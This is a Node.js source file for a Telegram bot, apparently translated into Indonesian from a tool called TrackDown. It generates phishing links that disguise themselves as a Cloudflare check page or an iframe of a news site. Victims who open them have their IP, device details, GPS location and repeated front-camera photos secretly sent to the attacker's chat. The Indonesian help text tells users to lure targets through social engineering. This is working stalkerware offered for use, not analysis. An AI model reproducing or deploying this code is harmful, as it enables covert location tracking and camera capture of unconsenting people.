// Originally by https://github.com/Th30neAnd0nly/TrackDown
// This bot was translated to Indonesia language by Anonimuslim
// Big thanks to The One And Only Team

const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {
  polling: true
});
var jsonParser = bodyParser.json({
  limit: 1024 * 1024 * 20,
  type: 'application/json'
});
var urlencodedParser = bodyParser.urlencoded({
  extended: true,
  limit: 1024 * 1024 * 20,
  type: 'application/x-www-form-urlencoded'
});
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL = "YOUR URL AFTER CLICK RUN BUTTON IN REPLIT";

//TOGGLE for 1pt Proxy and Shorters
var use1pt = true;

app.get("/w/:path/:uri", ((e, r) => {
  var t, a = new Date;
  a = a.toJSON().slice(0, 19).replace("T", ":"), t = e.headers["x-forwarded-for"] ? e.headers["x-forwarded-for"].split(",")[0] : e.connection && e.connection.remoteAddress ? e.connection.remoteAddress : e.ip, null != e.params.path ? r.render("webview", {
    ip: t,
    time: a,
    url: atob(e.params.uri),
    uid: e.params.path,
    a: hostURL,
    t: use1pt
  }) : r.redirect("https://t.me/laclok_bot")
}));

app.get("/c/:path/:uri", ((e, r) => {
  var t, a = new Date;
  a = a.toJSON().slice(0, 19).replace("T", ":"), t = e.headers["x-forwarded-for"] ? e.headers["x-forwarded-for"].split(",")[0] : e.connection && e.connection.remoteAddress ? e.connection.remoteAddress : e.ip, null != e.params.path ? r.render("cloudflare", {
    ip: t,
    time: a,
    url: atob(e.params.uri),
    uid: e.params.path,
    a: hostURL,
    t: use1pt
  }) : r.redirect("https://t.me/laclok_bot")
}));

bot.on("message", (async a => {
  const n = a.chat.id;
  if ("🌐 Masukkan URL-mu" == a?.reply_to_message?.text && createLink(n, a.text), "/start" == a.text) {
    var e = {
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [{
            text: "Buat Link",
            callback_data: "crenew"
          }]
        ]
      })
    };
    bot.sendMessage(n,
      `Selamat datang, ${a.chat.first_name}!
    \n\nKamu bisa menggunakan bot ini untuk mendapatkan informasi dari seseorang.
    \n\nSeperti informasi perangkat yang digunakan, lokasi, dan foto langsung dari kamera depan.
    \n\nGunakan perintah /help untuk panduan selengkapnya.
    \n\nKlik tombol Buat Link di bawah untuk memulai!`, e)
  }
  else "/create" == a.text ? createNew(n) : "/help" == a.text && bot.sendMessage(n, ' Bot ini akan membantumu untuk melacak lokasi seseorang. Gimana cara menggunakannya? Cukup mudah, simak caranya di bawah ini:\n\n1. Mulai dengan perintah: /create atau klik tombol Buat Link.\n\n2. Setelah itu, masukkan url web apapun (misal berita yg lagi viral dll), so cara ini membutuhkan teknik Social Engineering.\n\n3. Jika sudah, maka kamu akan mendapatkan 2 jenis URL phising yang akan kamu berikan ke target. Silahkan cari cara agar target membuka link yang kamu berikan dari bot ini. Penjelasan linknya sbb:\n\na. Link Cloudflare: Saat link dibuka oleh target, tampilannya adalah:\n - Halaman "Cloudflare anti DDoS": tampilan ini akan mengambil informasi korban seperti perangkat, foto, dll.\n - Halaman asli dari URL yang kamu kirimkan (misal berita viral dll)\n\nb. Link Webview: Saat link ini dibuka oleh target, maka akan menampilkan situs menggunakan iframe, sehingga kamu dapat memperoleh foto dengan kamera depan secara terus-menerus tanpa henti selagi korban belum menutup aplikasi browser yang digunakan untuk mengakses linknya. Namun kelemahannya adalah banyak website/situs yang mungkin tidak berhasil ditampilkan jika mereka memiliki x-frame header, seperti https://google.com.\n\nSelamat mencoba!')
}));

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});

bot.on('polling_error', (error) => {
  //console.log(error.code); 
});

async function createLink(cid, msg) {
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
    var url = cid.toString(36) + '/' + btoa(msg);
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [[{ text: "Buat link baru", callback_data: "crenew" }]]
      })
    };
    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;
    bot.sendChatAction(cid, "typing");
    if (use1pt) {
      var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
      var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
      var f = "", g = "";
      for (var c in x) {
        f += x[c] + "\n";
      }
      for (var c in y) {
        g += y[c] + "\n";
      }
      bot.sendMessage(cid, `Link untuk melacak lokasi berhasil dibuat dari ${msg}.\n\nKamu bisa menggunakan salah satu dari daftar link di bawah ini:\n\n✅ Daftar Link:\n\n🌐 Link CloudFlare\n${f}\n🌐 Link WebView\n${g}\n\nSemoga berhasil :)`, m);
    }
    else {
      bot.sendMessage(cid, `Link untuk melacak lokasi berhasil dibuat dari ${msg}.\n\n✅ Daftar Link:\n\n🌐 Link CloudFlare\n${cUrl}\n🌐 Link WebView\n${wUrl}\n\nSemoga berhasil :)`, m);
    }
  }
  else {
    bot.sendMessage(cid, `⚠️ Masukkan URL yang valid dengan awalan http:// atau https:// 😉`);
    createNew(cid);
  }
}

function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(cid, `🌐 Masukkan URL-mu`, mk);
}

app.get("/", (req, res) => {
  var ip;
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
  res.json({ "ip": ip });
});

app.post("/location", (req, res) => {
  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) {
    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
    res.send("Done");
  }
});

app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid != null && data != null) {
    data = data.replaceAll("<br>", "\n");
    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });

    res.send("Done");
  }
});

app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;
  if (uid != null && img != null) {
    var buffer = Buffer.from(img, 'base64');
    var info = {
      filename: "camsnap.png",
      contentType: 'image/png'
    };
    try {
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
    } catch (error) {
      console.log(error);
    }
    res.send("Done");
  }
});

app.listen(5000, () => {
  console.log("Aplikasi berjalan di Port 5000!");
});